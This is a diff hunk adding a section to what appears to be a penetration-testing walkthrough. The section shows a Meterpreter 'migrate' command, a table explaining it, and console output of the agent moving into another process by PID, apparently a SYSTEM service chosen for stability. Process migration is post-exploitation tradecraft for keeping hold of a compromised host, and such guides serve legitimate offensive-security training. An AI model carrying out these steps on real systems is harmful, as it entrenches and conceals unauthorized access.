@@ -1357,6 +1357,31 @@ The general rule to carry: prefer a boring, native, always-running SYSTEM servic
 <div align="center">
 <br>
 <br>
+</div>
+
+**Command**
+
+```
+migrate 532
+```
+
+**Breakdown**
+
+|Component|Purpose|
+|---|---|
+|`migrate 532`|Moves the running Meterpreter agent into the process with the given PID, carrying the session with it. The PID is the target chosen in section 3.7.|
+
+**Result**
+
+```
+meterpreter > migrate 532
+[*] Migrating from 2260 to 532...
+[*] Migration completed successfully.
+meterpreter > 
+```
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
